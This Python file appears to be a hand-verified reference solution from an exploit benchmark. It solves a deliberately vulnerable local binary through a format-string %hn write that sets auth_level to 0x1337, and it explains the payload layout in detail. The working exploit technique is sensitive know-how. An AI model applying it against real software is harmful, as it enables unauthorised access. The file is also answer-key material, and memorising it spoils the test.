#!/usr/bin/env python3
"""
Hand-verified standalone pwntools reference exploit for corpus_r2 target
06_fmtstr_short_write.

Technique: format-string arbitrary WRITE using the 2-byte %hn directive to
land an EXACT 16-bit magic value (0x1337) into a global `auth_level`,
rather than round-1's 06_fmtstr_arbwrite which used a full 8-byte %n write
to merely make a bool nonzero.

Protections: canary=OFF, NX=ON, PIE=OFF, RELRO=partial, dynamic (static
addresses, no leak needed for the write target itself).

Stack layout discovery (empirical, via a %1$p..%20$p probe with an
"AAAAAAAA" marker at the start of the input buffer): argument index 6
corresponds to bytes buf[0:8] -- i.e. `buf` itself is included directly in
printf's positional-argument stack scan, and each subsequent index N
covers buf[(N-6)*8 : (N-6)*8+8].

Payload construction:
  - "%6$4919cN$hn" is wrong shorthand; actual directive is
    "%6$4919c%8$hn": %6$4919c reads argument 6 (whatever garbage is at
    buf[0:8] -- its value is irrelevant, only the WIDTH matters) and pads
    output to exactly 4919 characters (0x1337 decimal), so the running
    printed-character count is exactly 0x1337 when %8$hn executes.
  - %8$hn writes the low 16 bits of that running count (0x1337) to the
    address stored at argument index 8, i.e. buf[16:24].
  - The raw 8-byte address of auth_level is placed at buf[16:24], which
    requires the format-directive text to be padded to exactly 16 bytes
    first (13 literal directive bytes + 3 bytes of 'A' padding).
  - Critically, the directives come BEFORE the raw address bytes, not
    after: `auth_level`'s address is 0x404062, whose second byte is 0x00,
    and printf treats `buf` as a NUL-terminated C string, so an embedded
    NUL from an address placed early truncates format-string parsing
    before any later directive is ever reached. Putting the address last
    (after all directives) sidesteps this entirely.

Anti-gaming: confirmed with plain benign input ("hello world") that the
program prints "access denied" and exits cleanly (rc=0) -- auth_level
starts at 0 and is never touched without the deliberate %hn write above.

Run directly:
    python3 06_fmtstr_short_write_reference.py
"""
import os
import sys

from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
TARGET_DIR = os.path.join(HERE, "..", "corpus_r2", "06_fmtstr_short_write")
BINARY = os.path.join(TARGET_DIR, "fmtstr_short_write")
FLAG_FILE = os.path.join(TARGET_DIR, "flag.txt")

context.arch = "amd64"
context.log_level = "error"

AUTH_MAGIC = 0x1337  # == 4919 decimal, the required %c field width


def exploit():
    elf = ELF(BINARY, checksec=False)
    auth_addr = elf.symbols["auth_level"]

    io = process(elf.path, cwd=TARGET_DIR)
    io.recvuntil(b"msg: ")

    fmt = f"%6${AUTH_MAGIC}c%8$hn".encode()
    pad = b"A" * (16 - len(fmt))
    payload = fmt + pad + p64(auth_addr)
    io.sendline(payload)
    return io


def main():
    with open(FLAG_FILE) as f:
        expected_flag = f.read().strip()

    io = exploit()
    output = io.recvrepeat(timeout=3)
    io.close()

    ok = expected_flag.encode() in output
    print(f"[{'PASS' if ok else 'FAIL'}] 06_fmtstr_short_write: "
          f"expected flag {'found' if ok else 'NOT found'} in output")
    if not ok:
        print("---- captured output (tail) ----")
        print(output[-300:])
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
